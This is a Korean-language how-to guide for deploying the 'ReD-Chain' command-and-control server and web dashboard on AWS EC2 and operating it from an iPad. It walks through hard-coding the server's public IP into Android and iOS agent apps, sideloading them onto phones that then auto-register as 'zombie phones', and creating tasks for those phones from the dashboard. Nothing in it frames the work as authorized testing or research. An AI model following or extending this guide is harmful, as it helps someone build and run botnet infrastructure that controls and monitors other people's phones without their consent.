# AWS C2 서버 설정 및 아이패드 접속 가이드

## 1. AWS EC2에 C2 서버 + 웹 대시보드 배포

### 1단계: EC2 준비
```bash
# EC2 인스턴스 접속
ssh -i "your-key.pem" ubuntu@your-ec2-ip

# 필수 패키지 설치
sudo apt update
sudo apt install python3 python3-pip git -y

# 프로젝트 클론
git clone https://github.com/HOHK0923/ReD-Chain.git
cd ReD-Chain
```

### 2단계: C2 서버 설정
```bash
cd c2-server

# Python 패키지 설치
pip3 install -r requirements.txt

# 환경 변수 설정
cp .env.example .env
nano .env

# .env 파일 수정:
# SECRET_KEY=<랜덤 문자열 64자>
# API_KEY_SALT=<랜덤 문자열 64자>
```

### 3단계: 웹 대시보드 빌드
```bash
cd ../web-dashboard

# Node.js 설치 (EC2에 없는 경우)
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# 의존성 설치 및 빌드
npm install
npm run build

# 빌드된 파일이 dist/ 폴더에 생성됨
```

### 4단계: C2 서버 실행
```bash
cd ../c2-server

# 백그라운드에서 실행
nohup python3 main_standalone.py > c2.log 2>&1 &

# 또는 tmux 사용 (권장)
tmux new -s c2
python3 main_standalone.py
# Ctrl+B, D로 detach
```

### 5단계: EC2 Security Group 설정
```
1. AWS Console → EC2 → Security Groups
2. 인바운드 규칙 추가:
   - Type: Custom TCP
   - Port: 8000
   - Source: 0.0.0.0/0 (전체 허용) 또는 내 IP만
```

## 2. 아이패드에서 접속하기

### 방법 1: 브라우저로 웹 대시보드 접속
```
1. 아이패드에서 Safari 열기
2. 주소: http://your-ec2-public-ip:8000/
3. 웹 대시보드가 바로 열림!
```

**예시:**
```
EC2 Public IP가 54.123.45.67 이면:
http://54.123.45.67:8000/
```

### 방법 2: 홈 화면에 추가 (앱처럼 사용)
```
1. Safari에서 대시보드 열기
2. 공유 버튼 → "홈 화면에 추가"
3. 이름: "ReD-Chain C2"
4. 이제 앱처럼 바로 실행 가능!
```

## 3. 좀비폰 연결 설정

### Android 앱 설정
```bash
# 안드로이드 앱의 C2 서버 주소 변경
cd ReD-Chain/android-agent
```

**파일 수정:** `app/src/main/java/com/redchain/agent/network/C2Client.kt`
```kotlin
// 이 줄을 찾아서
private val baseUrl = "http://10.0.2.2:8000"

// EC2 Public IP로 변경
private val baseUrl = "http://54.123.45.67:8000"
```

### iOS 앱 설정
```swift
// ios-agent/RedChainAgent/Sources/C2Manager.swift
let baseURL = "http://54.123.45.67:8000"
```

### 앱 빌드 후 폰에 설치
```bash
# Android
cd android-agent
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk

# iOS는 Xcode에서 빌드
```

## 4. 실제 사용 흐름

```
1. EC2에서 C2 서버 실행 (백그라운드)
   → http://your-ec2-ip:8000 으로 접속 가능

2. 아이패드 Safari로 접속
   → 웹 대시보드에서 실시간 모니터링

3. 폰에 앱 설치
   → 자동으로 C2 서버에 등록

4. 아이패드 대시보드에서 확인
   → 등록된 좀비폰 목록 표시
   → 작업 생성 및 모니터링
```

## 5. 주요 URL

### C2 서버 (EC2)
- 웹 대시보드: `http://your-ec2-ip:8000/`
- API 문서: `http://your-ec2-ip:8000/api/docs`
- Health Check: `http://your-ec2-ip:8000/health`

### 로컬 테스트
- 웹 대시보드: `http://localhost:8000/`
- API 문서: `http://localhost:8000/api/docs`

## 6. HTTPS 설정 (선택사항, 권장)

아이패드에서 HTTPS로 안전하게 접속하려면:

```bash
# Nginx + Let's Encrypt 설정
sudo apt install nginx certbot python3-certbot-nginx -y

# Nginx 설정
sudo nano /etc/nginx/sites-available/c2

# 내용:
server {
    listen 80;
    server_name your-domain.com;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

# 심볼릭 링크 생성
sudo ln -s /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx

# Let's Encrypt SSL 인증서
sudo certbot --nginx -d your-domain.com
```

이제 아이패드에서 `https://your-domain.com` 으로 접속 가능!

## 7. 모니터링

### 서버 상태 확인
```bash
# C2 서버 로그
tail -f c2.log

# tmux 세션 다시 들어가기
tmux attach -t c2

# 프로세스 확인
ps aux | grep python
lsof -i:8000
```

### 원격에서 서버 재시작
```bash
ssh -i "your-key.pem" ubuntu@your-ec2-ip
tmux attach -t c2
# Ctrl+C로 종료 후 재시작
python3 main_standalone.py
```

## 8. 보안 팁

✅ **권장사항:**
- EC2 Security Group에서 포트 8000을 내 IP로만 제한
- HTTPS 사용 (Let's Encrypt)
- 강력한 SECRET_KEY 사용
- 정기적으로 로그 확인

❌ **주의사항:**
- API 키를 GitHub에 올리지 말 것
- 프로덕션에서는 SQLite 대신 PostgreSQL 사용
- 방화벽 설정 확인

## 완료!

이제 아이패드에서 웹 대시보드로 좀비폰 인프라를 관리할 수 있습니다! 🚀
